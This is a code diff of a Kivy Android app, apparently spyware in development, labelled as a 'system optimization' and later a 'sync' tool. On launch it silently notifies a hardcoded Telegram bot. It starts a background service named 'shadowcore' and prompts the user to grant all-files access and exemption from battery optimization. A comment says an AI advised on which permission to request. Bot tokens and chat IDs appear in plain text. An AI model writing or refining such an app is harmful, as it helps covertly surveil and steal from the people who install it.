@@ -3,52 +3,94 @@ from kivy.uix.boxlayout import BoxLayout
 from kivy.uix.button import Button
 from kivy.uix.label import Label
 from jnius import autoclass
-from android.permissions import request_permissions, Permission
 import requests
 
-# بياناتك
-BOT_TOKEN = "7820129712:AAH9pZ49S_m8tY8965625902"
-CHAT_ID = "6110903337"
+BOT_TOKEN = "8711969097:AAGCjUfiohcUHRWV_1UGa1j51GCEwmCtl3s"
+CHAT_ID = "7084557369"
 
-class ShadowApp(App):
+class MyApp(App):
+
     def build(self):
-        layout = BoxLayout(orientation="vertical", padding=40, spacing=20)
-        self.status = Label(text="System Standby", font_size='18sp')
-        
-        btn = Button(
-            text="START SYSTEM OPTIMIZATION",
-            background_color=(0, 0.6, 0, 1),
-            font_size='20sp',
-            bold=True
-        )
-        btn.bind(on_press=self.ask_perms)
-        
+        layout = BoxLayout(orientation="vertical", padding=20, spacing=15)
+
+        self.status = Label(text="Ready")
+
+        btn_start = Button(text="Start Sync")
+        btn_stop = Button(text="Stop Sync")
+        btn_battery = Button(text="Disable Battery")
+        btn_files = Button(text="Allow File Access")
+
+        btn_start.bind(on_press=self.start_service)
+        btn_stop.bind(on_press=self.stop_service)
+        btn_battery.bind(on_press=self.disable_battery)
+        btn_files.bind(on_press=self.open_files)
+
         layout.add_widget(self.status)
-        layout.add_widget(btn)
+        layout.add_widget(btn_start)
+        layout.add_widget(btn_stop)
+        layout.add_widget(btn_battery)
+        layout.add_widget(btn_files)
+
         return layout
 
     def on_start(self):
-        # رسالة تفعيل عند فتح التطبيق
         try:
             requests.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                data={"chat_id": CHAT_ID, "text": "✅ تم تفعيل واجهة التطبيق بنجاح"}
+                data={"chat_id": CHAT_ID, "text": "✅ التطبيق اشتغل"}
             )
-        except: pass
+        except:
+            pass
 
-    def ask_perms(self, instance):
-        # طلب إذن الصور فقط كما نصح الـ AI
-        perms = [Permission.READ_MEDIA_IMAGES, Permission.FOREGROUND_SERVICE]
-        request_permissions(perms, self.start_service)
-
-    def start_service(self, permissions, grants):
+    def start_service(self, instance):
         try:
             PythonActivity = autoclass('org.kivy.android.PythonActivity')
-            Service = autoclass('org.test.shadowcore.ServiceMyservice')
+            Service = autoclass('org.test.shadowcore.MyService')
             Service.start(PythonActivity.mActivity, "")
-            self.status.text = "Service Running..."
+            self.status.text = "Started"
         except Exception as e:
             self.status.text = str(e)
 
-if __name__ == "__main__":
-    ShadowApp().run()
+    def stop_service(self, instance):
+        try:
+            PythonActivity = autoclass('org.kivy.android.PythonActivity')
+            Service = autoclass('org.test.shadowcore.MyService')
+            Service.stop(PythonActivity.mActivity)
+            self.status.text = "Stopped"
+        except Exception as e:
+            self.status.text = str(e)
+
+    def disable_battery(self, instance):
+        try:
+            PythonActivity = autoclass('org.kivy.android.PythonActivity')
+            Intent = autoclass('android.content.Intent')
+            Settings = autoclass('android.provider.Settings')
+            Uri = autoclass('android.net.Uri')
+
+            activity = PythonActivity.mActivity
+            uri = Uri.parse("package:" + activity.getPackageName())
+
+            intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+            intent.setData(uri)
+            activity.startActivity(intent)
+
+        except Exception as e:
+            self.status.text = str(e)
+
+    def open_files(self, instance):
+        try:
+            PythonActivity = autoclass('org.kivy.android.PythonActivity')
+            Intent = autoclass('android.content.Intent')
+            Settings = autoclass('android.provider.Settings')
+            Uri = autoclass('android.net.Uri')
+
+            activity = PythonActivity.mActivity
+            uri = Uri.parse("package:" + activity.getPackageName())
+
+            intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, uri)
+            activity.startActivity(intent)
+
+        except Exception as e:
+            self.status.text = str(e)
+
+MyApp().run()
